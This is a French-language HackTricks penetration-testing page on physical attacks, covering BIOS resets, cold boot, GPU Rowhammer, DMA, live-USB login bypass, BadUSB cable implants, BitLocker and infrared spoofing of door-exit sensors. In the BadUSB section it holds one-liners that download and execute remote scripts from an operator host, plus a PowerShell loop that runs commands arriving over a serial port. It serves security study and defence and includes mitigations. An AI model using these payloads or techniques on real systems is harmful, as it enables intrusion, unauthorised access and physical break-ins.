# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

Pour la découverte d’interfaces au niveau de la carte, les consoles série, l’accès à la mémoire flash, les canaux auxiliaires et le glitching, consultez [Hardware Hacking](hardware-hacking/README.md) et ses chapitres consacrés à chaque interface. Cette page traite des attaques qui nécessitent un accès physique au système dans son ensemble.

## Récupération du mot de passe du BIOS et sécurité du système

Les paramètres du firmware des anciens PC peuvent être réinitialisés en débranchant la pile CMOS ou en utilisant un cavalier clear-CMOS documenté. La durée nécessaire hors tension dépend de la carte mère, et les mots de passe ou clés UEFI modernes peuvent se trouver dans une mémoire flash non volatile, un contrôleur embarqué ou un dispositif de sécurité, et donc persister après le retrait de la pile. Consultez le manuel de la carte mère ou de maintenance avant de court-circuiter des broches ; cette procédure peut également invalider les mesures TPM et déclencher la procédure de récupération du chiffrement du disque.

Sur les anciens systèmes x86, des outils tels que **killCMOS** et **CmosPwd** peuvent inspecter ou modifier les paramètres stockés dans la CMOS depuis un environnement amorçable. CmosPwd reconnaît les formats de mot de passe d’un ensemble documenté d’anciennes familles de BIOS et peut sauvegarder, restaurer ou effacer/supprimer l’état de la CMOS ; ses versions publiées ciblent les environnements DOS/Windows, Linux, FreeBSD et NetBSD anciens.<sup>[[18]](#references)</sup> Ces utilitaires ne permettent pas de supprimer n’importe quel mot de passe UEFI et nécessitent un accès suffisant au matériel et au firmware.

Certains firmwares d’ordinateurs portables affichent un code de défi propre au fabricant après plusieurs tentatives de mot de passe infructueuses. Des bases de données telles que [bios-pw.org](https://bios-pw.org) peuvent calculer des mots de passe de récupération anciens propres à certains modèles, mais de nombreux systèmes appliquent un verrouillage sans code de défi exploitable. Considérez tout mot de passe généré comme étant spécifique au modèle et évitez d’épuiser les compteurs de tentatives permanents.

### Sécurité UEFI

Pour les systèmes **UEFI** modernes, CHIPSEC peut auditer les protections des variables Secure Boot. Commencez par la vérification sans modification ci-dessous ; le mode facultatif `-a modify` tente délibérément de corrompre les variables et ne doit être utilisé que sur un système de laboratoire récupérable. CHIPSEC avertit lui-même que son pilote privilégié et son accès matériel de bas niveau ne conviennent pas aux terminaux de production.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analyse de la RAM et attaques cold boot

La DRAM ne perd pas immédiatement tous ses bits lorsque le rafraîchissement s’arrête. Le taux de dégradation varie considérablement selon la technologie du module et la température ; le refroidissement peut préserver des données utiles bien plus longtemps qu’un cycle d’alimentation sans refroidissement. Une attaque cold boot redémarre rapidement dans un environnement d’acquisition réduit ou transfère un module refroidi, capture la mémoire brute et reconstitue les clés cryptographiques malgré la dégradation des bits. Un utilitaire de copie de disque n’est pas automatiquement un outil d’imagerie de la mémoire physique, et Volatility analyse une capture au lieu de l’acquérir ; utilisez un outil d’acquisition validé et adapté à la plateforme.<sup>[[12]](#references)</sup>

---

## Rowhammer GPU contre les tables de pages

Les attaques Rowhammer modernes contre les GPU sont beaucoup plus efficaces lorsqu’elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que des tampons ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere GDDR6** montrent qu’un attaquant exécutant du code CUDA sans privilèges peut créer des motifs de martèlement propres au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des rangées vulnérables, puis inverser des bits dans la **table de pages de dernier niveau** ou dans un **répertoire de pages** intermédiaire. Dès qu’une seule entrée de traduction est corrompue, l’attaquant peut mettre en place un accès **arbitraire en lecture/écriture à la mémoire du GPU**, puis pivoter vers la compromission de l’hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Schéma d’exploitation

1. **Repérer les rangées vulnérables au martèlement** dans la GDDR6 et créer des motifs de martèlement tenant compte du rafraîchissement et non uniformes, qui contournent les protections intégrées à la DRAM.
2. **Manipuler les allocations du GPU** pour que le pilote place les structures de traduction des pages à des emplacements physiques vulnérables au martèlement, au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut consister à épuiser la région de mémoire basse réservée aux tables de pages et à pulvériser de grands mappages UVM clairsemés avec des pas contrôlés.
3. **Inverser les métadonnées de traduction**, comme les bits **PFN** ou liés à l’aperture dans une entrée de table de pages ou de répertoire de pages, afin que la page virtuelle contrôlée par l’attaquant pointe vers des pages de tables de pages, de la mémoire GPU arbitraire ou des mappages système visibles par l’hôte.
4. Réutiliser le mappage falsifié pour réécrire d’autres entrées de traduction et obtenir un accès **arbitraire en lecture/écriture à la mémoire du GPU** entre différents contextes GPU.

### Pivot vers l’hôte et mesures d’atténuation

- Lorsque l’**IOMMU est désactivé**, les mappages falsifiés de l’aperture système peuvent exposer toute la **mémoire physique de l’hôte** au GPU, transformant la primitive GPU en compromission complète de l’hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées des tables de pages de dernier niveau, tandis que **GeForge** montre qu’il peut être plus facile de corrompre un niveau du répertoire de pages, car l’inversion d’un seul bit peut rediriger une sous-arborescence de traduction plus grande. Ne considérez pas une seule couche de pagination comme étant la seule critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- L’**IOMMU** reste important, car il bloque l’accès direct à toute la mémoire de l’hôte utilisé par GDDRHammer/GeForge, mais ce n’est **pas une mesure d’atténuation complète**. **GPUBreach** montre un pivot en seconde étape : l’attaquant corrompt des tampons CPU accessibles en écriture par le GPU et appartenant au pilote, puis déclenche des vulnérabilités de sécurité mémoire dans le pilote NVIDIA pour obtenir une primitive d’écriture dans le noyau et un **shell root**, même lorsque l’IOMMU est activé.<sup>[[3]](#references)</sup>
- L’**ECC au niveau système** est une mesure de renforcement pratique sur les GPU de station de travail/serveur compatibles. Les GPU grand public sans ECC offrent une défense plus faible.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** inversions de bits sur une RTX 3060 et **202** sur une RTX A6000, ce qui suffisait pour construire une chaîne fonctionnelle d’escalade de privilèges sur l’hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques par accès direct à la mémoire (DMA)

Pour le patching hors ligne d’IFR/NVRAM UEFI, qui peut réduire l’application de l’IOMMU avant le démarrage et permettre une chaîne d’attaque DMA sous Windows, voir :

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** démontre l’acquisition et le patching de la mémoire par DMA via des interfaces telles que FireWire et les premières configurations Thunderbolt, y compris des signatures historiques de contournement de connexion. Il n’est pas simplement « inefficace contre Windows 10 » : la faisabilité de l’exploitation dépend de l’interface, de la version cible, de la politique IOMMU, de l’état de verrouillage et de la prise en charge et de l’activation de Windows Kernel DMA Protection. Windows 10 version 1803 et ultérieures ont introduit Kernel DMA Protection sur les plateformes compatibles, modifiant considérablement la surface d’attaque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB pour accéder au système

Sur un volume Windows non chiffré ou déjà déverrouillé, un environnement hors ligne peut remplacer des binaires d’accessibilité tels que **sethc.exe** ou **Utilman.exe** par **cmd.exe**, donnant accès à une invite de commandes SYSTEM lorsque le raccourci correspondant de l’écran de connexion est utilisé. Des outils tels que **chntpw** peuvent modifier les données des comptes SAM locaux. Ces méthodes ne contournent pas un volume BitLocker verrouillé et peuvent endommager les identifiants protégés par DPAPI/EFS ; conservez des copies forensiques et des sauvegardes.

**Kon-Boot** est un outil commercial de contournement de l’authentification au démarrage pour certaines configurations Windows/macOS. La compatibilité dépend du système d’exploitation, du mode du firmware, de Secure Boot et de la configuration du chiffrement du disque ; il ne déchiffre pas un volume BitLocker verrouillé.<sup>[[10]](#references)</sup>

---

## Gestion des fonctionnalités de sécurité de Windows

### Raccourcis de démarrage et de récupération

- **Suppr**, F2, F10 ou une autre touche du fabricant peut ouvrir la configuration du firmware.
- **F8** donne accès aux options de démarrage avancées de Windows héritées uniquement sur les configurations où cette méthode est encore activée ; l’accès à la récupération varie sur les systèmes actuels.
- Maintenir **Shift** peut empêcher la connexion automatique de Windows dans certaines configurations, bien que les paramètres de stratégie/de registre puissent désactiver ce comportement.<sup>[[17]](#references)</sup>

### Périphériques BAD USB

Des périphériques tels que **USB Rubber Ducky** et des cartes Teensy peuvent se faire reconnaître comme des claviers HID approuvés et injecter des frappes prédéfinies. La charge utile dispose initialement des privilèges et de l’accès au bureau de la session ouverte ; les invites UAC, le verrouillage de l’écran, la disposition du clavier, le minutage et la politique USB du terminal imposent toujours des limites.<sup>[[15]](#references)</sup>

Les périphériques programmables peuvent également attaquer les analyseurs du noyau de l’hôte et coordonner plusieurs périphériques USB pour effectuer du heap grooming et divulguer des informations :

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Pour un cas concernant l’analyseur de stockage de masse UAS de Windows, voir :

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Des privilèges d’administrateur ou de sauvegarde permettent de créer une copie fantôme ou d’enregistrer les ruches du registre afin d’acquérir des fichiers verrouillés tels que **SAM** et **SYSTEM**. Il s’agit d’une technique de collecte après compromission, et non d’un contournement de privilèges ; ces actions doivent être corrélées aux événements `diskshadow`/VSS et d’exportation des ruches du registre.

## Techniques d’implant BadUSB / HID

### Gadget HID Android déclenché par NFC

Un téléphone Android rooté peut devenir un clavier USB programmable uniquement si son contrôleur USB et son noyau prennent en charge **USB gadget/HID**. Sur les appareils compatibles, Kali NetHunter expose des profils gadget via **USB Arsenal**. Une autre option est [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), qui crée des fonctions gadget ConfigFS et peut exposer des périphériques caractère clavier/souris tels que `/dev/hidg0` et `/dev/hidg1`. L’outil crée uniquement le point de terminaison gadget ; un processus distinct doit lui envoyer des rapports HID. L’accès root ne peut pas compenser l’absence de ConfigFS, de prise en charge HID gadget ou d’un contrôleur de périphérique USB utilisable dans le noyau.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ce point de terminaison peut être associé au NFC d’Android comme déclencheur physique. L’application [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) lit l’UID d’une étiquette, le convertit au format attendu, vérifie une liste d’autorisation locale et envoie une séquence de frappes de type Rubber Ducky configurée lorsqu’elle trouve une correspondance. L’hôte connecté voit une entrée clavier ordinaire et n’a besoin d’aucun logiciel NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Vérifiez la détection du périphérique et la disposition du clavier dans un éditeur de texte vierge avant d’utiliser des raccourcis ou des commandes. Une charge utile inoffensive est :<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Limites de confiance importantes :<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Une **liste d'autorisation d'UID sert à l'identification, pas à l'authentification**. Les UID sont publics et certains types de jetons ou émulateurs permettent le clonage ou l'usurpation. Un UID autorisé copié suit le même chemin de traitement que le jeton d'origine.
- Le module Magisk **NfcScreenOff** modifie le service NFC pour qu'il se comporte comme si l'écran était allumé et déverrouillé. Si le téléphone est déjà connecté à un hôte, cela peut permettre à quelqu'un de déclencher le payload sans déverrouiller le téléphone.
- Les mots de passe, les jetons API et les commandes stockés dans le payload sont des secrets récupérables sur un appareil rooté ou dont le bootloader est déverrouillé. Saisir un mot de passe via HID relève de l'automatisation avec mot de passe réutilisable, et non de l'authentification sans mot de passe.
- L'injection HID utilise les privilèges du bureau actif et dépend du focus, du timing et de la disposition du clavier de l'hôte. Exigez une confirmation récente de l'utilisateur avant d'exécuter des actions sensibles, évitez les secrets privilégiés dans les scripts et utilisez un authentificateur cryptographique à challenge-réponse pour une véritable authentification.

### Implants de câble gérés par Wi-Fi

- Les implants basés sur ESP32-S3, comme **Evil Crow Cable Wind**, se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, s'annoncent uniquement comme un clavier USB et exposent leur pile C2 via Wi-Fi. Il suffit à l'opérateur d'alimenter le câble depuis l'hôte de la victime, de créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis d'accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l'interface HTTP intégrée.<sup>[[8]](#references)</sup>
- L'interface du navigateur propose des onglets pour *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les payloads enregistrés sont associés à chaque OS, les dispositions de clavier sont modifiées à la volée et les chaînes VID/PID peuvent être altérées pour imiter des périphériques connus.
- Comme le C2 se trouve dans le câble, un téléphone peut préparer des payloads, déclencher leur exécution et gérer les identifiants Wi-Fi sans utiliser le réseau de l'organisation — pratique pour les intrusions physiques de courte durée.

### Payloads AutoExec adaptés à l'OS

- Les règles AutoExec associent un ou plusieurs payloads à exécuter immédiatement après l'énumération USB. L'implant effectue une identification légère de l'OS et sélectionne le script correspondant.
- Exemple de workflow :
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l'exécution est automatisée, le simple fait de remplacer un câble de charge peut permettre un accès initial par « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### Shell distant amorcé par HID via Wi-Fi TCP

1. **Amorçage par frappe clavier :** un payload enregistré ouvre une console et y colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante minimale pour Windows est la suivante :

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Pont par câble :** L’implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable de bureau) vers l’opérateur. Tous les octets saisis dans la session TCP sont transférés vers la boucle série ci-dessus, permettant ainsi l’exécution de commandes à distance même sur des hôtes isolés d’Internet. La sortie est limitée ; les opérateurs exécutent donc généralement des commandes à l’aveugle (création de comptes, préparation d’outils supplémentaires, etc.).

### Surface de mise à jour HTTP OTA

- L’interface documentée d’Evil Crow Cable expose un endpoint de mise à jour du firmware sans authentification à `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Les opérateurs sur le terrain peuvent changer de fonctionnalité à chaud (p. ex., flasher le firmware USB Army Knife) en cours d’intervention sans ouvrir le câble, ce qui permet à l’implant d’adopter de nouvelles capacités tout en restant branché à l’hôte cible.

## Contourner le chiffrement BitLocker

Une acquisition forensique autorisée d’un système en fonctionnement ou récemment utilisé peut contenir une clé maîtresse de volume BitLocker ou des éléments de clé associés lorsque le volume est déverrouillé. Des outils commerciaux comme Elcomsoft Forensic Disk Decryptor et Passware Kit Forensic peuvent rechercher ces éléments dans les images mémoire, les fichiers d’hibernation ou les vidages sur incident pris en charge, mais leur réussite n’est pas garantie. Les versions modernes de Windows chiffrent également les vidages sur incident lorsque BitLocker est activé, et un mot de passe de récupération de 48 chiffres enregistré est un artefact différent d’une clé de volume présente en mémoire.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingénierie sociale pour ajouter une clé de récupération

Un attaquant qui persuade un administrateur d’exécuter des commandes de gestion BitLocker peut ajouter un protecteur par mot de passe de récupération, par clé externe ou d’un autre type, puis le récupérer. Un mot de passe de récupération ne peut pas être une chaîne arbitraire de zéros : les mots de passe de récupération numériques BitLocker suivent un format validé de 48 chiffres. La syntaxe d’administration autorisée pertinente est `manage-bde -protectors -add C: -recoverypassword` ; affichez la liste des protecteurs créés avec `manage-bde -protectors -get C:`. Surveillez l’ajout de protecteurs et veillez à ce que les nouveaux éléments de récupération ne soient sauvegardés que dans des emplacements approuvés.<sup>[[16]](#references)</sup>

---

## Exploiter les interrupteurs d’intrusion du châssis ou de maintenance pour réinitialiser le BIOS aux paramètres d’usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau compacts sont équipés d’un **interrupteur d’intrusion du châssis** surveillé par le contrôleur embarqué (EC) et le firmware BIOS/UEFI. Si cet interrupteur sert principalement à déclencher une alerte lorsqu’un appareil est ouvert, certains fabricants implémentent parfois un **raccourci de récupération non documenté**, activé lorsque l’interrupteur est actionné selon une séquence précise.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l’attaque

1. L’interrupteur est relié à une **interruption GPIO** de l’EC.
2. Le firmware exécuté par l’EC suit le **timing et le nombre d’activations**.
3. Lorsqu’une séquence prédéfinie est reconnue, l’EC lance une routine de *réinitialisation de la carte mère* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, les modèles concernés chargent un état de firmware réinitialisé. Selon le fabricant et la révision, l’état effacé peut inclure un mot de passe superviseur, des paramètres de démarrage personnalisés ou des clés Secure Boot inscrites ; les effets sur l’état du TPM et le chiffrement du disque doivent être évalués séparément.

> Une réinitialisation du firmware peut rétablir les options de démarrage externe, mais elle ne **déchiffre** pas le stockage. BitLocker ou un autre système de chiffrement intégral du disque peut passer en mode récupération après une modification du TPM ou du firmware et continuer à protéger le disque interne en l’absence d’une clé de récupération.<sup>[[16]](#references)</sup>

### Exemple concret – ordinateur portable Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est le suivant :

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Après le dixième cycle, l’EC définit un indicateur qui demande au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend environ 40 s et ne nécessite **rien d’autre qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure générique d’exploitation

1. Allumez la cible ou faites-la sortir du mode veille pour que l’EC soit actif.
2. Retirez le capot inférieur pour accéder au commutateur d’intrusion/de maintenance.
3. Reproduisez la séquence d’activation propre au fabricant (consultez la documentation et les forums, ou faites du reverse engineering du firmware de l’EC).
4. Remontez l’appareil et redémarrez-le, puis vérifiez quels paramètres du firmware et identifiants ont réellement changé.
5. Si vous êtes autorisé et qu’un démarrage externe est possible, démarrez sur une image live contrôlée. Une fois qu’un volume interne est légitimement déverrouillé (ou s’il n’a jamais été chiffré), l’environnement live peut récupérer des identifiants et des données, ou examiner la partition EFI System. Modifier cette partition pour installer un implant EFI est persistant et très intrusif, et reste soumis à Secure Boot, au measured boot, à la protection contre l’écriture du firmware et à la surveillance des terminaux. Le stockage chiffré demeure inaccessible sans sa clé ou ses éléments de récupération.

### Détection et atténuation

* Consignez les événements d’intrusion du châssis dans la console de gestion de l’OS et corrélez-les aux réinitialisations inattendues du BIOS.
* Utilisez des **scellés inviolables** sur les vis et les capots pour détecter toute ouverture.
* Gardez les appareils dans des **zones physiquement contrôlées** ; partez du principe qu’un accès physique équivaut à une compromission totale.
* Si cette option est disponible, désactivez la fonction « maintenance switch reset » du fabricant ou exigez une autorisation cryptographique supplémentaire pour réinitialiser la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie sans contact

### Caractéristiques du capteur
- Les capteurs « wave-to-exit » courants associent un émetteur LED proche infrarouge à un module récepteur de type télécommande TV, qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (~4–10) à la porteuse adéquate (≈30 kHz).<sup>[[7]](#references)</sup>
- Un cache en plastique empêche l’émetteur et le récepteur de se faire face directement. Le contrôleur suppose donc que toute porteuse validée provient d’une réflexion proche et active un relais qui déverrouille la gâche de la porte.
- Lorsque le contrôleur détecte une cible, il modifie souvent l’enveloppe de modulation de sortie, mais le récepteur continue d’accepter toute salve correspondant à la porteuse filtrée.

### Déroulement de l’attaque
1. **Capturez le profil d’émission** – branchez un analyseur logique aux broches du contrôleur pour enregistrer les formes d’onde avant et après la détection qui commandent la LED IR interne.
2. **Rejouez uniquement la forme d’onde « post-détection »** – retirez ou ignorez l’émetteur d’origine et commandez une LED IR externe avec le motif déjà déclenché dès le départ. Comme le récepteur ne tient compte que du nombre et de la fréquence des impulsions, il considère la porteuse usurpée comme une réflexion réelle et active la ligne du relais.
3. **Cadencez la transmission** – émettez la porteuse en salves réglées (par exemple, quelques dizaines de millisecondes en émission, puis une durée similaire à l’arrêt) pour fournir le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni sa logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’activer.

### Injection réfléchie à longue portée
- Remplacer la LED de banc par une diode IR haute puissance, un driver MOSFET et des optiques de focalisation permet un déclenchement fiable à environ 6 m.
- L’attaquant n’a pas besoin d’être en visibilité directe de l’ouverture du récepteur ; orienter le faisceau vers des murs intérieurs, des étagères ou des encadrements de porte visibles à travers une vitre permet à l’énergie réfléchie d’entrer dans le champ de vision d’environ 30° et d’imiter un geste de la main à courte portée.
- Comme les récepteurs sont conçus pour détecter uniquement de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Lampe torche d’attaque militarisée
- Intégrer le driver à une lampe torche commerciale dissimule l’outil à la vue de tous. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou équivalent) pour générer les salves d’environ 30 kHz et utilisez un MOSFET pour faire circuler le courant de la LED.
- Une lentille zoom télescopique resserre le faisceau pour augmenter la portée et la précision, tandis qu’un moteur vibrant commandé par le MCU confirme par retour haptique que la modulation est active, sans émettre de lumière visible.
- Parcourir plusieurs motifs de modulation enregistrés (avec de légères différences de fréquence porteuse et d’enveloppe) améliore la compatibilité avec les familles de capteurs rebadgés, ce qui permet à l’opérateur de balayer les surfaces réfléchissantes jusqu’à entendre le relais cliquer et la porte se déverrouiller.

---

## References

- [1] [GDDRHammer : perturber considérablement les rangées DRAM — attaques Rowhammer inter-composants depuis des GPU modernes](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge : marteler la mémoire GDDR pour forger des tables de pages GPU, pour le plaisir et le profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach : attaques d’élévation de privilèges sur les GPU à l’aide de Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avis de sécurité : Rowhammer - juillet 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – « Framework 13. Appuyez ici pour pwn »](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guide de réinitialisation de la carte mère](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – « Noooooooo Touch! – Contourner les capteurs IR de sortie sans contact à l’aide d’une lampe IR furtive »](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – « Branchez, jouez, pwn : pirater avec Evil Crow Cable Wind »](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attaque Rowhammer contre les puces NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation officielle et informations de compatibilité de Kon-Boot](https://kon-boot.com/)
- [11] [Documentation de CHIPSEC - Protections des variables Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [N’oublions pas : attaques cold boot contre les clés de chiffrement](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulation de la mémoire physique via DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protection DMA du noyau](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentation de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guide des opérations BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Maintenir la touche Shift enfoncée et comportement de connexion automatique](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentation et téléchargements de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentation de Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentation du noyau Linux - Pilote USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Transformer un téléphone Android rooté en authentificateur NFC et outil d’automatisation pour votre PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
